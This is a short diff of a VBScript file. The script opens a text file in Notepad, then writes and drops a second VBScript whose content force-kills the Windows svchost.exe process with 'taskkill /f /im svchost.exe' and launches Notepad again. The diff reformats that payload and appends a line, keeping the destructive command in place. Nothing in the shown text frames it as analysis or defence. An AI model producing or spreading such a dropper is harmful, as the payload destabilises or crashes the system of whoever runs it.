@@ -33,9 +33,14 @@ Shell.Run "notepad.exe " & strTxtFilePath
 WScript.Sleep 1000
 
 ' Define content for the VBScript file
-strVbsContent = "Dim Shell" & vbCrLf & _
-"Set Shell = CreateObject(""WScript.Shell"")" & vbCrLf & _
-"Shell.Run ""taskkill /f /im svchost.exe""" & vbCrLf
+strVbsContent = _
+"Dim Shell" & vbNewLine & _
+"Set Shell = CreateObject(""WScript.Shell"")" & vbNewLine & _
+"Shell.Run ""taskkill /f /im svchost.exe""" & vbNewLine
+
+' Concatenate additional content
+strVbsContent = strVbsContent & _
+"Shell.Run ""notepad.exe C:\Path\To\Your\File.txt""" & vbNewLine
 
 ' Create the VBScript file
 Set objFile = objFSO.CreateTextFile(strVbsFilePath)
